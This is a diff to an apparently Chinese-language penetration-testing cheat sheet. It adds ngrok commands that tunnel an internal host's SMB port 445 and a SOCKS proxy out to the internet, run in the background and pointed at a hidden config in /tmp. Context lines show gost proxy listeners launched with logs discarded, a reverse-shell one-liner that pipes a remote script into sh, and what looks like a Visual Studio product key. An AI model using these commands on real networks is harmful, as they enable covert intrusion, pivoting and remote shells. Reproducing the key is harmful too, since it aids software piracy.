@@ -170,6 +170,19 @@ Visual Studio Professional 2022 TD244-P4NB7-YQ6XK-Y8MMM-YWV2J
 ./gost -L=http2://:443 -L=socks5://:1080 -L=ss://aes-128-cfb:123456@:8338	//多端口监听
 nohup ./gost -L=:1080 > /dev/null 2>&1 &	//后台运行不记录日志
 ```
+### ngrok指定内网ip端口
+```
+./ngrok tcp 192.168.0.225:445
+```
+### ngrok+s5.py内网渗透拍档
+```
+nohup python s5.py 1080 &	//后台运行s5.py
+nohup ./ngrok tcp 1080 -log=stdout &	//后台运行ngrok，此处必须加入-log=stdout参数
+```
+### ngrok修改默认配置路径
+```
+./ngrok tcp 1080 -config /tmp/.ngrok2/ngrok.yml
+```
 # 反弹shell
 ```
 curl https://reverse-shell.sh/yourip:1337 | sh
